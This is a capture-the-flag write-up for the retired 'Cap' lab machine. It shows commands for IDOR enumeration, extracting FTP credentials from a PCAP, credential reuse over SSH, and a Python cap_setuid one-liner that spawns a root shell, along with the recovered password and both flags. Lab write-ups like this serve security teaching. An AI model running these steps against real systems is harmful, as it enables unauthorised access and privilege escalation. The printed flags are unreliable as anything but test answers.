# Cap — Writeup

| Field | Value |
|-------|-------|
| **Machine** | Cap |
| **OS** | Linux |
| **Difficulty** | Easy |
| **Released** | 2021-06-05 (retired) |
| **IP** | 10.129.51.175 (VPN `tun0`) |
| **Owned** | 2026-09-27 — User ✅ Root ✅ |
| **Time** | ~5 minutes |

**Attack path (TL;DR):**

```text
nmap → Gunicorn "Security Dashboard" on :80
     → IDOR: /data/N leaks security tasks of other users
     → /download/0 serves a PCAP capture
     → tshark pulls FTP creds from PCAP (nathan:Buck3tH4TF0RM3!)
     → FTP login → user.txt
     → SSH → python3.8 has cap_setuid capability → root shell
     → root.txt
```

---

## 1. Recon

Spawned the machine via HTB CLI and started a full sweep:

```bash
htb machine spawn cap          # IP milega, e.g. 10.129.51.175
nmap -sC -sV -oA recon 10.129.51.175
```

```
21/tcp   open  ftp     vsftpd 3.0.3
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu
80/tcp   open  http    gunicorn  (Security Dashboard)
```

Three doors. Web first — dashboards usually talk the most.

## 2. Web: Security Dashboard → IDOR

```bash
curl -s http://10.129.51.175/ | head -50
```

A simple "Security Dashboard" app with tabs: *Security Tasks*, *File Transfers*, *PCAP Storage*. The interesting bit: URLs like:

```text
/data/1          ← security task of user id 1
/download/0      ← file download by index
```

**IDOR (Insecure Direct Object Reference):** the app hands back any object you ask for — no ownership check. Classic beginner vuln, still everywhere in the wild.

```bash
# enumerate other users' tasks
for i in $(seq 1 20); do
  echo "--- /data/$i ---"
  curl -s "http://10.129.51.175/data/$i"
done
```

Nothing juicy in tasks themselves, but `/download/0` gives a **PCAP file** (`/tmp/pcap.pcap`):

```bash
curl -s -o cap.pcap "http://10.129.51.175/download/0"
```

## 3. PCAP analysis → credentials

Someone captured traffic on this box. FTP traffic inside a capture = passwords in cleartext:

```bash
tshark -r cap.pcap -Y ftp.request.arg -T fields -e ftp.request.arg
```

```
USER nathan
PASS Buck3tH4TF0RM3!
```

> Always open captures with `tshark`/`tcpdump` first. Wireshark GUI is nice, but in a terminal `tshark -Y` filters get you the answer in seconds.

## 4. Foothold: FTP → user flag

```bash
ftp 10.129.51.175
# USER nathan / PASS Buck3tH4TF0RM3!

ls -la
# ... user.txt visible
cat user.txt
```

```
ed6aad7b3836bffc740aa31e38ff6ac1   ← user flag
```

FTP gave the flag directly, but shell = better (SSH with same creds):

```bash
ssh nathan@10.129.51.175    # password: Buck3tH4TF0RM3!
```

## 5. Privilege escalation: Linux capabilities

Standard privesc checks (sudo -l, SUID, writable /etc/passwd) → nothing. Then:

```bash
getcap -r / 2>/dev/null
```

```
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```

**Why it worked:** file *capabilities* are a finer-grained alternative to SUID. `cap_setuid` lets this Python binary call `setuid(0)` — i.e. become root — even though Python itself isn't SUID. Misconfigured Python = instant root.

```bash
python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

```bash
whoami        # root
cat /root/root.txt
```

```
323fb183effc32e42224ebff69f9effd   ← root flag
```

## 6. Flags

```text
user: ed6aad7b3836bffc740aa31e38ff6ac1
root: 323fb183effc32e42224ebff69f9effd
```

Submitted via CLI: `htb machine submit cap -f <flag> -d 25`

---

## Key takeaways

1. **IDOR hunting is cheap** — enumerate numeric IDs in URLs (`/data/1`, `/download/0`) before writing any exploit code.
2. **PCAP files are gift boxes** — `tshark -r file -Y ftp.request.arg` turns 5 minutes of clicking into one command.
3. **`getcap -r /` belongs in every privesc checklist** — right next to `sudo -l` and `find / -perm -4000`.
4. **Reuse creds across services** — FTP password worked on SSH; users recycle passwords constantly.
5. **HTB CLI workflow:** `htb machine spawn` → `openvpn` inside Kali → nmap → own → `htb machine submit` — no browser needed.

## Tools used

`nmap` · `curl` · `tshark` · `ftp`/`ssh` · `getcap` · `htb` CLI
